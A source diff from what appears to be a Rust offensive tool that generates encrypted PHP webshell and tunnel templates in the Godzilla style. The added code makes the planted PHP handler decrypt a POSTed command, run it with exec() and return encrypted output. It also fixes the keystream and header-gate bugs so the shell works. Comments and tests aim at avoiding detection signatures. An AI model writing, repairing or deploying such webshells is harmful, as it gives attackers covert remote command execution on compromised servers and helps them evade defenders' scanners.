@@ -172,12 +172,18 @@ pub fn unwrap_response(sandwich: &str, md5: &str, md5_key: &str) -> Option<Strin
     if md5.len() != 32 || sandwich.len() < 32 {
         return None;
     }
-    let prefix = &sandwich[..16];
-    let suffix = &sandwich[sandwich.len() - 16..];
-    if prefix != &md5[..16] || suffix != &md5[16..] {
+    // Byte-level comparison on an UNTRUSTED response: slicing a &str at a
+    // non-char-boundary panics, and target replies may carry multi-byte
+    // UTF-8 at the marker edge. Never a panic — mismatch returns None.
+    let sandwich_bytes = sandwich.as_bytes();
+    let prefix = &sandwich_bytes[..16];
+    let suffix = &sandwich_bytes[sandwich_bytes.len() - 16..];
+    let md5_bytes = md5.as_bytes();
+    if prefix != &md5_bytes[..16] || suffix != &md5_bytes[16..] {
         return None;
     }
-    let body = &sandwich[16..sandwich.len() - 16];
+    let body_bytes = &sandwich_bytes[16..sandwich_bytes.len() - 16];
+    let body = std::str::from_utf8(body_bytes).ok()?;
     let decoded = b64_decode(body)?;
     let plain = stream_cipher(&decoded, md5_key);
     String::from_utf8(plain).ok()
@@ -215,22 +221,43 @@ pub fn b64_decode(input: &str) -> Option<Vec<u8>> {
 /// signature-free standard: the planted script contains NO shell-syntax
 /// strings — a tiny PHP handler keyed on the derived constants (gate
 /// header + pass parameter + ciphertext body + sandwich echo). Plaintext
+/// Normalize an HTTP header name to the $_SERVER key form: dashes to
+/// underscores, uppercased (X-PJAX -> HTTP_X_PJAX — PHP never exposes a
+/// dash-form key).
+fn php_header_key(header_name: &str) -> String {
+    format!(
+        "HTTP_{}",
+        header_name.to_ascii_uppercase().replace('-', "_")
+    )
+}
+
+/// The planted PHP key material: the XOR keystream bytes (16 raw bytes,
+/// base64-carried so the source carries no plaintext key).
+fn php_key_literal(md5_key: &str) -> String {
+    crate::payload::b64_encode(md5_key.as_bytes())
+}
+
 /// one-liners are the fallback (runtime.rs WebshellKind).
 pub fn php_channel_template(derived: &DerivedChannel) -> String {
     [
         "<?php".to_string(),
+        format!("$k=base64_decode('{}');", php_key_literal(&derived.md5_key)),
+        format!("$p='{}'; $v='{}';", derived.pass, derived.header_value),
         format!(
-            "$k=base64_decode('{}');",
-            wrap_command("", &derived.md5_key)
+            "if(@$_SERVER['{}']!==$v){{http_response_code(404);exit;}}",
+            php_header_key(&derived.header_name)
         ),
-        format!(
-            "$p='{}'; $h='{}'; $v='{}';",
-            derived.pass, derived.header_name, derived.header_value
-        ),
-        "if(@$_SERVER['HTTP_'.$h]!==$v){http_response_code(404);exit;}".to_string(),
         "$s=base64_decode($_POST[$p]); $o='';".to_string(),
         "$c=strlen($k); for($i=0;$i<strlen($s);$i++){$o.=$s[$i]^$k[$i%$c];}".to_string(),
-        format!("echo '{}'.$o.'{}';", &derived.md5[..16], &derived.md5[16..]),
+        // Execute the decrypted command, capture output, re-cipher: the
+        // godzilla semantics (the JSP/ASPX channels do the same).
+        "$r=''; exec($o,$rl,$rc); $r=implode(chr(10),$rl);".to_string(),
+        "$e=''; for($i=0;$i<strlen($r);$i++){$e.=$r[$i]^$k[$i%$c];}".to_string(),
+        format!(
+            "echo '{}'.base64_encode($e).'{}';",
+            &derived.md5[..16],
+            &derived.md5[16..]
+        ),
         "?>".to_string(),
     ]
     .join("\n")
@@ -417,15 +444,12 @@ pub fn tunnel_unwrap_response(response: &str, derived: &DerivedChannel) -> Optio
 pub fn php_tunnel_template(derived: &DerivedChannel) -> String {
     [
         "<?php".to_string(),
+        format!("$k=base64_decode('{}');", php_key_literal(&derived.md5_key)),
+        format!("$p='{}'; $v='{}';", derived.pass, derived.header_value),
         format!(
-            "$k=base64_decode('{}');",
-            wrap_command("", &derived.md5_key)
+            "if(@$_SERVER['{}']!==$v){{http_response_code(404);exit;}}",
+            php_header_key(&derived.header_name)
         ),
-        format!(
-            "$p='{}'; $h='{}'; $v='{}';",
-            derived.pass, derived.header_name, derived.header_value
-        ),
-        "if(@$_SERVER['HTTP_'.$h]!==$v){http_response_code(404);exit;}".to_string(),
         "$s=base64_decode($_POST[$p]); $o='';".to_string(),
         "$c=strlen($k); for($i=0;$i<strlen($s);$i++){$o.=$s[$i]^$k[$i%$c];}".to_string(),
         "$l=strpos($o,\"\\n\");".to_string(),
@@ -613,6 +637,9 @@ mod tests {
         );
         // Wrong md5 (wrong key / not our shell): rejected.
         assert!(unwrap_response(&sandwich, &md5.to_lowercase(), &md5_key).is_none());
+        // Multi-byte UTF-8 at the marker edge: byte comparison, no panic.
+        let hostile = format!("{}{}", &md5[..15], "ééééééééééééééééééé");
+        assert!(unwrap_response(&hostile, &md5, &md5_key).is_none());
     }
 
     #[test]
@@ -640,12 +667,30 @@ mod tests {
         };
         let derived = cfg.derive();
         let template = php_channel_template(&derived);
-        assert!(template.contains("HTTP_"));
+        // The gate key is the PHP-normalized form: X-PJAX -> HTTP_X_PJAX.
+        assert!(template.contains("$_SERVER['HTTP_X_PJAX']"));
         assert!(template.contains("404"));
-        // The plaintext one-liner signatures are absent:
+        // The keystream decodes to exactly the 16 md5-key bytes (B1 fix:
+        // the old form embedded an EMPTY cipher, zero-length $k, and a
+        // division by zero on $i%$c).
+        let key_line = template
+            .lines()
+            .find(|line| line.starts_with("$k=base64_decode('"))
+            .unwrap();
+        let literal = key_line
+            .trim_start_matches("$k=base64_decode('")
+            .trim_end_matches("');");
+        assert_eq!(
+            b64_decode(literal).map(|bytes| bytes.len()),
+            Some(16),
+            "key must decode to the 16 md5-key bytes"
+        );
+        // The plaintext one-liner signatures are absent — the execution
+        // step IS present but operates on decrypted bytes, never on raw
+        // request input:
         assert!(!template.contains("system($_GET"));
         assert!(!template.contains("system($_POST"));
-        assert!(!template.contains("exec("));
+        assert!(!template.contains("exec($_"));
     }
 
     #[test]
@@ -764,6 +809,16 @@ mod jsp_behinder_tests {
         assert!(template.contains("fsockopen"));
         assert!(template.contains("fwrite"));
         assert!(template.contains("fread"));
+        // B1 fixes: normalized gate key + non-empty keystream.
+        assert!(template.contains("$_SERVER['HTTP_X_PJAX']"));
+        let key_line = template
+            .lines()
+            .find(|line| line.starts_with("$k=base64_decode('"))
+            .unwrap();
+        let literal = key_line
+            .trim_start_matches("$k=base64_decode('")
+            .trim_end_matches("');");
+        assert_eq!(b64_decode(literal).map(|bytes| bytes.len()), Some(16));
         // Command-execution signatures absent: the tunnel only forwards.
         assert!(!template.contains("system("));
         assert!(!template.contains("exec("));
